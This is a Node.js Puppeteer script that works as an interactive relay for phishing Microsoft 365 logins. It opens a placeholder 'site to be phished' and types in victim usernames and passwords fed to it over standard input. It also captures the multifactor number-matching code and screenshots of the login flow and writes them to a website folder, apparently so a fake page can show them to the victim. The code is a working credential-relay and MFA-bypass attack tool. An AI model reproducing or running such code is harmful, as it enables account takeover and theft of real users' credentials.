const puppeteer = require('puppeteer');
const readline = require('readline');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  const screenshotfile = '../website/grafik.png';
  const screenypath = '../website/screenshots/';
  const mfscreenshotfile = '../website/mf.png';


  console.log('Puppeteer ready. Type a command (e.g. "goto https://example.com", "screenshot", or "exit")');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false
  });

  rl.on('line', async (line) => {
    const [command, ...args] = line.trim().split(' ');
    const argStr = args.join(' ');

    try {
      switch (command) {
        case 'goto':
          console.log(`Navigating to ${argStr}...`);
          await page.goto('https://url_der_zu_phishenden_webseite.de');
//move to Login Page
//          await page.click('.m365-hero__button--primary-rounded');
          await page.click('xpath=//a[@id="hero-banner-sign-in-microsoft-365-link"]');
          console.log('Navigation complete.');

          break;

        case 'screenshot':
          console.log('Create Screenshot...');
          const screeny = screenypath + argStr;
          await page.setViewport({width: 1920, height: 1080});
          await page.screenshot({ path: screeny });
          console.log(`Screenyshot saved to ${argStr}`);
          break;

        //Input Username
        case 'user':
          console.log(`Login User: ${argStr}...`);
          const resultsSelector = '.input.text-box';
          await page.waitForSelector(resultsSelector);
          await page.type(resultsSelector, argStr);
          await page.click('xpath=//input[@id="idSIButton9"]');
          break;

        //Input Password
        case 'pw':
          console.log(`pw command `);
          const pwSelector = '.input.text-box';
          await page.waitForSelector(pwSelector);
          await page.type(pwSelector, argStr);
          await page.click('xpath=//input[@id="idSIButton9"]');
          const displaySignSelector = 'xpath=//div[@id="idRichContext_DisplaySign"]'
          await page.waitForSelector(displaySignSelector);
//          await page.setViewport({width: 1920, height: 1080});
//          await page.screenshot({ path: mfscreenshotfile });
//          console.log(`Screenshot saved to ${mfscreenshotfile}`);
          const divInhalt = await page.$eval(displaySignSelector, el => el.textContent.trim());
          console.log('Multifaktor: ', divInhalt);
          break;

        case 'mf':
          console.log(`mf command ${argStr}`);
          await page.setViewport({width: 1920, height: 1080});
          await page.screenshot({ path: screenshotfile });
          console.log('Image');
          console.log(`Screenshot saved to ${screenshotfile}`);
          break

//        case 'title':
//          const title = await page.title();
//          console.log(`Page title: ${title}`);
//          break;

        case 'exit':
          console.log('Closing browser...');
          await browser.close();
          rl.close();
          process.exit(0);
          break;

        default:
          console.log(`Unknown command: ${command}`);
      }
    } catch (err) {
      console.error('Error executing command:', err.message);
    }
  });
})();
